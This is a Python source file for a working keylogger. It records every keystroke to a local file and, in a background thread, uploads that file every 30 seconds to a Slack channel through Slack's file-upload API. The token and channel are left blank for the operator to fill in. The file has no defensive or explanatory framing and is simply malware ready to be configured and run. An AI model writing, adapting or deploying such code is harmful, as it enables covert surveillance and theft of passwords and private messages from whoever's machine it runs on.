from inspect import getfile
from pickle import TRUE
from time import sleep
from pynput import keyboard
import json
import sys
import requests
import threading


class KeyLogger():
    def __init__(self, filename: str = "keylogs.txt") -> None:
        self.filename = filename

    @staticmethod
    def get_char(key):
        try:
            return key.char
        except AttributeError:
            return str(key)

    def on_press(self, key):
        print(key)
        with open(self.filename, 'a') as logs:
            logs.write(self.get_char(key))

    def main(self):
        listener = keyboard.Listener(
            on_press=self.on_press,
        )
        listener.start()


def logger():
    logger = KeyLogger()
    logger.main()
    input()

def get_file_content(file_name):
    content = ''
    with open(file_name, 'rb') as f:
        content = f.read()
    return content

# Post file with slack
def send_file():
    while True:
        sleep(30)
        content = get_file_content('keylogs.txt')
        url = "https://slack.com/api/files.upload"
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        data = {
            'token': '', #input user token from slack
            'channels': '', # create channel name for your choice in slack and enter the name here
            'content': content,
            'filename': 'keylogs.txt',
            'filetype': 'text',
            'title': 'keylogs.txt',
        }
        res = requests.post(url=url, data=data, headers=headers)

t1 = threading.Thread(target=logger)
t2 = threading.Thread(target=send_file)

t1.start()
t2.start()
